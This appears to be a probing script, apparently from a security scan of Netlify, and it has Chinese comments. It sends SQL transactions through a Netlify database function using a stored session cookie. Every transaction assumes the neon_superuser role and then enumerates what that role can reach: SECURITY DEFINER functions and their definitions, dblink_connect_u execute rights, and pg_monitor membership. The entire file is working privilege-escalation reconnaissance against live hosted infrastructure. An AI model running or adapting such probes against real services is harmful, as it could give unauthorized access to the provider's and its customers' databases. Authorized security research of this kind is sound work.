# -*- coding: utf-8 -*-
"""波18:SET ROLE neon_superuser 组合面——同事务数组内 set role + 探测
J1 neon_superuser 拥有的对象 / J2 prosecdef 函数全表(owner+ACL)/ J3 dblink_connect_u ACL
J4 set role 后尝试敏感操作 / J5 pg_monitor 成员
"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    """transaction action:同连接同事务执行数组"""
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:6000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


print('=== J1: neon_superuser 拥有的对象 ===')
s, b, dt = tx(["set role neon_superuser",
               "select 'tables' as t, count(*) from pg_class c join pg_namespace n on c.relnamespace=n.oid where c.relowner = (select oid from pg_roles where rolname='neon_superuser') and n.nspname not in ('pg_catalog','information_schema')",
               "select 'funcs' as t, count(*) from pg_proc p where p.proowner = (select oid from pg_roles where rolname='neon_superuser') and p.pronamespace not in (select oid from pg_namespace where nspname in ('pg_catalog','information_schema'))",
               "select 'schemas' as t, count(*) from pg_namespace where nspowner = (select oid from pg_roles where rolname='neon_superuser')"])
print('[%d] %.1fs %s' % (s, dt, b[:1500]))

print('=== J2: prosecdef 函数全表(所有 schema,ACL)===')
s, b, dt = tx(["set role neon_superuser",
               """select n.nspname, p.proname, pg_get_function_identity_arguments(p.oid) as args,
                  p.proowner::regrole::text as owner,
                  coalesce(array_to_string(p.proacl::text[], ','), 'NULL') as acl
                  from pg_proc p join pg_namespace n on p.pronamespace = n.oid
                  where p.prosecdef and n.nspname not in ('pg_catalog','information_schema')
                  order by n.nspname, p.proname"""])
print('[%d] %.1fs %s' % (s, dt, b[:5000]))

print('=== J3: dblink_connect_u 权限视角(neon_superuser)===')
s, b, dt = tx(["set role neon_superuser",
               "select has_function_privilege(current_user, 'dblink_connect_u(text,text)', 'EXECUTE') as can_exec"])
print('[%d] %.1fs %s' % (s, dt, b[:800]))

print('=== J4: pg_monitor 成员 + 我(owner)可执行的 prosecdef ===')
s, b, dt = tx(["set role neon_superuser",
               """select r.rolname from pg_auth_members m join pg_roles r on m.member=r.oid
                  where m.roleid=(select oid from pg_roles where rolname='pg_monitor') and r.rolname=current_user""",
               """select p.proname, pg_get_function_identity_arguments(p.oid) as args, p.proowner::regrole::text as owner
                  from pg_proc p where p.prosecdef and has_function_privilege(current_user, p.oid, 'EXECUTE')
                  and p.pronamespace not in (select oid from pg_namespace where nspname in ('pg_catalog','information_schema'))"""])
print('[%d] %.1fs %s' % (s, dt, b[:2000]))

print('=== J5: neon_superuser 拥有的 prosecdef 函数细节 ===')
s, b, dt = tx(["set role neon_superuser",
               """select p.proname, pg_get_function_identity_arguments(p.oid) as args,
                  pg_get_functiondef(p.oid) as def
                  from pg_proc p where p.prosecdef
                  and p.proowner = (select oid from pg_roles where rolname='neon_superuser')"""])
print('[%d] %.1fs %s' % (s, dt, b[:3000]))
